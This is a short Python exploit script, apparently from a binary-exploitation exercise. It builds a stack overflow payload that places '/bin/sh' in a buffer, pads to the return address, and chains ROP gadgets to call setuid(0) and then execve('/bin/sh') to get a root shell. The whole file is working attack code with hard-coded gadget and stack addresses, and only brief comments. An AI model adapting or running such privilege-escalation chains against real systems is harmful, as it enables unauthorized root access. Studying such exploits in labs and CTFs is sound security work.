#!/usr/bin/env python3

import sys

buf_addr = 0x7ffffff6b460  
padding_size = 0x7ffffff6b4d0 - 0x7ffffff6b460 # because rdp - 0x70 is 112 bytes + 8 bytes to return address 

payload  =  b'/bin/sh\x00'   
payload += b'A' * (padding_size)    
#start of ROP at the beginning of where the return address is 
payload += 0x0000000000456587.to_bytes(8,'little') #pop rax ; ret
payload += (105).to_bytes(8,'little') # 105 to pop into rax
payload += 0x000000000040250f.to_bytes(8,'little') #pop rdi ; ret
payload += (0).to_bytes(8,'little') #0 to pop into rdi
payload += (0x000000000041b506).to_bytes(8, 'little') #sys call
# end of setuid(0);

payload += 0x0000000000456587.to_bytes(8,'little') #pop rax ; ret
payload += (59).to_bytes(8,'little') # 59 to pop into rax
payload += 0x000000000040250f.to_bytes(8,'little') #pop rdi ; ret
payload += 0x7ffffff6b460.to_bytes(8,'little') #the address of where /bin/sin is 
payload +=0x000000000040a57e.to_bytes(8,'little') # pop 0 into rsi 
payload += (0).to_bytes(8,'little') #0 to pop into rsi
payload +=0x000000000048c0ab.to_bytes(8,'little') # pop 0 into rdx and rbx but put trash into rbx 
payload += (0).to_bytes(8,'little') #0 to pop into rdx
payload += (0).to_bytes(8,'little') #0 to pop into rbx
payload += (0x000000000041b506).to_bytes(8, 'little') #sys call
#end of execve("/bin/sh", 0, 0);

sys.stdout.buffer.write(payload)
